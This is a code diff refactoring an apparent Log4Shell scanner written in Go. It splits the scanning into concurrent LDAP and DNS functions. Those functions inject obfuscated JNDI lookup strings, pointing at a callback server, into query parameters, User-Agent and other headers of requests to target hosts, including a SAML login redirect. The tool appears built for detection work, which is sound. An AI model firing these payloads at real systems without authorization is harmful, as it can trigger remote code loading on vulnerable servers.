@@ -50,163 +50,198 @@ func ScanIP(hostUrl string, serverUrlLDAP string, serverUrlDNS string, reqType s
                 "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://",
                 "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:d}n${lower:s}}://",
         }
-        if reqType == "LDAP" {
+
+        switch reqType {
+        case "LDAP":
                 if strings.Contains(hostUrl, "ui/login") {
-                client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
-                return http.ErrUseLastResponse
-                }
-                        for _, LDAPpayload := range LDAPpayloads {
-
-                                baseUrl, err := url.Parse(hostUrl)
-                                targetUrl := baseUrl.String()
-                                request, err := http.NewRequest("GET", targetUrl, nil)
-                                if err != nil {
-                                        pterm.Error.Println(err)
-                                        log.Fatal(err)
-                                }
-                                response, _ := client.Do(request)
-                                if response != nil {
-                                        redirectUrl := response.Header.Get("location")
-                                        if len(redirectUrl) > 0  {
-                                                newUrl, _ := url.Parse(redirectUrl)
-                                                newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
-                                                traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
-                                                targetUserAgent := LDAPpayload + serverUrlLDAP + "/" + traceHint + "_User-Agent" + "}"
-                                                targetHeader := LDAPpayload + serverUrlLDAP + "/" + traceHint + "}"
-                                                newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
-                                                newRequest.Header.Set("User-Agent", targetUserAgent)
-                                                addCommonHeadersLDAP(&newRequest.Header,targetHeader)
-                                                newResponse, err := client.Do(newRequest)
-                                                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
-                                                        log.Debug(err)
-                                                }
-                                                if newResponse != nil {
-                                                        url := strings.Split(hostUrl, ":")
-                                                        if len(url) != 3 {
-                                                                log.Fatal("Error in response hostUrl parsing:", url)
-                                                        }
-                                                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], newResponse.StatusCode)
-                                                        updateCsvRecords(msg)
-                                                        resChan <- msg
-                                                        log.Infof(msg)
-                                                }
-                                        }
-                                }
+                        wgLDAPUi := sync.WaitGroup{}
+                        client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+                        return http.ErrUseLastResponse
                         }
-                } else {
                         for _, LDAPpayload := range LDAPpayloads {
+                                wgLDAPUi.Add(1)
+                                go ScanIPLDAPUi(hostUrl, serverUrlLDAP, LDAPpayload, client, &wgLDAPUi, resChan)
+                        }
+                        wgLDAPUi.Wait()
+                } else{
+                        wgLDAP := sync.WaitGroup{}
+                        for _, LDAPpayload := range LDAPpayloads {
+                                wgLDAP.Add(1)
+                                go ScanIPLDAP(hostUrl, serverUrlLDAP, LDAPpayload, client, &wgLDAP, resChan)
+                        }
+                        wgLDAP.Wait()
+                }
+        case "DNS":
+                if strings.Contains(hostUrl, "ui/login") {
+                        wgDNSUi := sync.WaitGroup{}
+                        client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+                        return http.ErrUseLastResponse
+                        }
+                        for _, DNSpayload := range DNSpayloads {
+                                wgDNSUi.Add(1)
+                                go ScanIPDNSUi(hostUrl, serverUrlDNS, DNSpayload, client, &wgDNSUi, resChan)
+                        }
+                        wgDNSUi.Wait()
+                } else {
+                        wgDNS := sync.WaitGroup{}
+                        for _, DNSpayload := range DNSpayloads {
+                                wgDNS.Add(1)
+                                go ScanIPDNS(hostUrl, serverUrlDNS, DNSpayload, client, &wgDNS, resChan)
+                        }
+                        wgDNS.Wait()
+                }
+        }
+}
 
-                                baseUrl, err := url.Parse(hostUrl)
-                                param := url.Values{}
-                                traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
-                                param.Add("x", LDAPpayload + serverUrlLDAP + "/" + traceHint + "}")
-                                baseUrl.RawQuery = param.Encode()
-                                targetUrl := baseUrl.String()
-                                targetUserAgent := LDAPpayload + serverUrlLDAP + "/" + traceHint + "_User-Agent" + "}"
-                                targetHeader := LDAPpayload + serverUrlLDAP + "/" + traceHint + "}"
-                                request, err := http.NewRequest("GET", targetUrl, nil)
-                                if err != nil {
-                                        pterm.Error.Println(err)
-                                        log.Fatal(err)
+func ScanIPLDAPUi(Url string, serverUrl string, payload string, client *http.Client, wg *sync.WaitGroup, resChan chan string) {
+        defer wg.Done()
+        baseUrl, err := url.Parse(Url)
+        targetUrl := baseUrl.String()
+        request, err := http.NewRequest("GET", targetUrl, nil)
+        if err != nil {
+                pterm.Error.Println(err)
+                log.Fatal(err)
+        }
+        response, err := client.Do(request)
+        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
+                log.Debug(err)
+        }
+        if response != nil {
+                redirectUrl := response.Header.Get("location")
+                if len(redirectUrl) > 0  {
+                        newUrl, _ := url.Parse(redirectUrl)
+                        newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
+                        traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
+                        targetUserAgent := payload + serverUrl+ "/" + traceHint + "_User-Agent" + "}"
+                        targetHeader := payload + serverUrl+ "/" + traceHint + "}"
+                        newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
+                        newRequest.Header.Set("User-Agent", targetUserAgent)
+                        addCommonHeadersLDAP(&newRequest.Header,targetHeader)
+                        newResponse, err := client.Do(newRequest)
+                        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
+                                log.Debug(err)
+                        }
+                        if newResponse != nil {
+                                url := strings.Split(Url, ":")
+                                if len(url) != 3 {
+                                        log.Fatal("Error in response hostUrl parsing:", url)
                                 }
-                                request.Header.Set("User-Agent", targetUserAgent)
-                                addCommonHeadersLDAP(&request.Header,targetHeader)
-                                response, err := client.Do(request)
-                                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
-                                        log.Debug(err)
-                                }
-                                if response != nil {
-                                        url := strings.Split(hostUrl, ":")
-                                        if len(url) != 3 {
-                                                log.Fatal("Error in response hostUrl parsing:", url)
-                                        }
-                                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
-                                        updateCsvRecords(msg)
-                                        resChan <- msg
-                                        log.Infof(msg)
-                                }
+                                msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], newResponse.StatusCode)
+                                updateCsvRecords(msg)
+                                resChan <- msg
+                                log.Infof(msg)
                         }
                 }
         }
 
-        if reqType == "DNS" {
-                if strings.Contains(hostUrl, "ui/login") {
-                client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
-                return http.ErrUseLastResponse
+}
+
+func ScanIPLDAP(Url string, serverUrl string, payload string, client *http.Client, wg *sync.WaitGroup, resChan chan string) {
+        defer wg.Done()
+        baseUrl, err := url.Parse(Url)
+        param := url.Values{}
+        traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
+        param.Add("x", payload + serverUrl+ "/" + traceHint + "}")
+        baseUrl.RawQuery = param.Encode()
+        targetUrl := baseUrl.String()
+        targetUserAgent := payload + serverUrl+ "/" + traceHint + "_User-Agent" + "}"
+        targetHeader := payload + serverUrl+ "/" + traceHint + "}"
+        request, err := http.NewRequest("GET", targetUrl, nil)
+        if err != nil {
+                pterm.Error.Println(err)
+                log.Fatal(err)
+        }
+        request.Header.Set("User-Agent", targetUserAgent)
+        addCommonHeadersLDAP(&request.Header,targetHeader)
+        response, err := client.Do(request)
+        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
+                log.Debug(err)
+        }
+        if response != nil {
+                url := strings.Split(Url, ":")
+                if len(url) != 3 {
+                        log.Fatal("Error in response hostUrl parsing:", url)
                 }
-                        for _, DNSpayload := range DNSpayloads {
+                msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
+                updateCsvRecords(msg)
+                resChan <- msg
+                log.Infof(msg)
+        }
 
-                                baseUrl, _ := url.Parse(hostUrl)
-                                targetUrl := baseUrl.String()
-                                request, err := http.NewRequest("GET", targetUrl, nil)
-                                request.Close = true
-                                if err != nil {
-                                        pterm.Error.Println(err)
-                                        log.Fatal(err)
-                                }
-                                response, _ := client.Do(request)
-                                if response != nil {
-                                        redirectUrl := response.Header.Get("location")
-                                        if len(redirectUrl) > 0  {
-                                                newUrl, _ := url.Parse(redirectUrl)
-                                                newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
-                                                targetUserAgent := DNSpayload + serverUrlDNS + "}"
-                                                targetHeader := DNSpayload + serverUrlDNS + "}"
-                                                newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
-                                                newRequest.Header.Set("User-Agent", targetUserAgent)
-                                                addCommonHeadersDNS(&newRequest.Header,targetHeader)
-                                                newResponse, err := client.Do(newRequest)
-                                                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
-                                                        log.Debug(err)
-                                                }
-                                                if newResponse != nil {
-                                                        url := strings.Split(hostUrl, ":")
-                                                        if len(url) != 3 {
-                                                                log.Fatal("Error in response hostUrl parsing:", url)
-                                                        }
-                                                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], newResponse.StatusCode)
-                                                        updateCsvRecords(msg)
-                                                        resChan <- msg
-                                                        log.Infof(msg)
-                                                }
-                                        }
-                                }
+}
+
+func ScanIPDNSUi(Url string, serverUrl string, payload string, client *http.Client, wg *sync.WaitGroup, resChan chan string) {
+        defer wg.Done()
+        baseUrl, _ := url.Parse(Url)
+        targetUrl := baseUrl.String()
+        request, err := http.NewRequest("GET", targetUrl, nil)
+        request.Close = true
+        if err != nil {
+                pterm.Error.Println(err)
+                log.Fatal(err)
+        }
+        response, err := client.Do(request)
+        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
+                log.Debug(err)
+        }
+        if response != nil {
+                redirectUrl := response.Header.Get("location")
+                if len(redirectUrl) > 0  {
+                        newUrl, _ := url.Parse(redirectUrl)
+                        newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
+                        targetUserAgent := payload + serverUrl+ "}"
+                        targetHeader := payload + serverUrl+ "}"
+                        newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
+                        newRequest.Header.Set("User-Agent", targetUserAgent)
+                        addCommonHeadersDNS(&newRequest.Header,targetHeader)
+                        newResponse, err := client.Do(newRequest)
+                        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
+                                log.Debug(err)
                         }
-                } else {
-                        for _, DNSpayload := range DNSpayloads {
-
-                                baseUrl, err := url.Parse(hostUrl)
-                                param := url.Values{}
-                                param.Add("x", DNSpayload + serverUrlDNS + "}")
-                                baseUrl.RawQuery = param.Encode()
-                                targetUrl := baseUrl.String()
-                                targetUserAgent := DNSpayload + serverUrlDNS + "}"
-                                targetHeader := DNSpayload + serverUrlDNS + "}"
-                                request, err := http.NewRequest("GET", targetUrl, nil)
-                                if err != nil {
-                                        pterm.Error.Println(err)
-                                        log.Fatal(err)
+                        if newResponse != nil {
+                                url := strings.Split(Url, ":")
+                                if len(url) != 3 {
+                                        log.Fatal("Error in response hostUrl parsing:", url)
                                 }
-                                request.Header.Set("User-Agent", targetUserAgent)
-                                addCommonHeadersDNS(&request.Header,targetHeader)
-                                response, err := client.Do(request)
-                                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
-                                        log.Debug(err)
-                                }
-                                if response != nil {
-                                        url := strings.Split(hostUrl, ":")
-                                        if len(url) != 3 {
-                                                log.Fatal("Error in response hostUrl parsing:", url)
-                                        }
-                                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
-                                        updateCsvRecords(msg)
-                                        resChan <- msg
-                                        log.Infof(msg)
-                                }
+                                msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], newResponse.StatusCode)
+                                updateCsvRecords(msg)
+                                resChan <- msg
+                                log.Infof(msg)
                         }
                 }
         }
+}
 
+func ScanIPDNS(Url string, serverUrl string, payload string, client *http.Client, wg *sync.WaitGroup, resChan chan string) {
+        defer wg.Done()
+        baseUrl, err := url.Parse(Url)
+        param := url.Values{}
+        param.Add("x", payload + serverUrl+ "}")
+        baseUrl.RawQuery = param.Encode()
+        targetUrl := baseUrl.String()
+        targetUserAgent := payload + serverUrl+ "}"
+        targetHeader := payload + serverUrl+ "}"
+        request, err := http.NewRequest("GET", targetUrl, nil)
+        if err != nil {
+                pterm.Error.Println(err)
+                log.Fatal(err)
+        }
+        request.Header.Set("User-Agent", targetUserAgent)
+        addCommonHeadersDNS(&request.Header,targetHeader)
+        response, err := client.Do(request)
+        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
+                log.Debug(err)
+        }
+        if response != nil {
+                url := strings.Split(Url, ":")
+                if len(url) != 3 {
+                        log.Fatal("Error in response hostUrl parsing:", url)
+                }
+                msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
+                updateCsvRecords(msg)
+                resChan <- msg
+                log.Infof(msg)
+        }
 }
 
 // GetLocalIP returns the non loopback local IP of the host
